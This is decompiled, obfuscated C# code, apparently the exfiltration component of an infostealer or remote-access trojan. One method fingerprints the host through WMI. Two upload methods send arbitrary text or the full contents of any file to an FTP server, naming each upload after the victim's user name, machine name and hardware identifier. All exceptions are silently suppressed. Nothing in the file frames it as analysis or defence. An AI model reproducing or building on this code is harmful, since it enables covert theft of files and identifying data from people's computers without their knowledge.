using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fmTenshUnV;

internal sealed class jCOJRzSaQahQUJH
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string FdEYtmTMffelS()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107404553));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107404564)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107404515);
			ManagementObject val3 = new ManagementObject(getString_0(107404542) + text2 + getString_0(107404501));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107404496)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107393163) : text;
		}
	}

	public static void YuYvdHAEpxhBUz(string jEjcQJYncXk = "URL", string jyJmqjukCpVFXy = "USERNAME", string nBgVwxKrKs = "ACCESO", string MoiYrntsFqiEI = "")
	{
		try
		{
			string text = FdEYtmTMffelS();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(jEjcQJYncXk + getString_0(107405880) + Environment.UserName + getString_0(107405835) + Environment.MachineName + getString_0(107405846) + text + getString_0(107405841));
			ftpWebRequest.Method = getString_0(107404471);
			ftpWebRequest.Credentials = new NetworkCredential(jyJmqjukCpVFXy, nBgVwxKrKs);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(MoiYrntsFqiEI);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void PrZGmImJdFgV(string seKLNqsyeRSrV = "URL", string XmnIQzvtvB = "USERNAME", string IslFTpmPtwCYt = "ACCESO", string IUMWVSqBquJwfb = "")
	{
		try
		{
			string text = FdEYtmTMffelS();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(seKLNqsyeRSrV + getString_0(107405880) + Environment.UserName + getString_0(107405835) + Environment.MachineName + getString_0(107405846) + text + getString_0(107405846) + Path.GetFileName(IUMWVSqBquJwfb));
			ftpWebRequest.Method = getString_0(107404471);
			ftpWebRequest.Credentials = new NetworkCredential(XmnIQzvtvB, IslFTpmPtwCYt);
			byte[] array = File.ReadAllBytes(IUMWVSqBquJwfb);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static jCOJRzSaQahQUJH()
	{
		Strings.CreateGetStringDelegate(typeof(jCOJRzSaQahQUJH));
	}
}
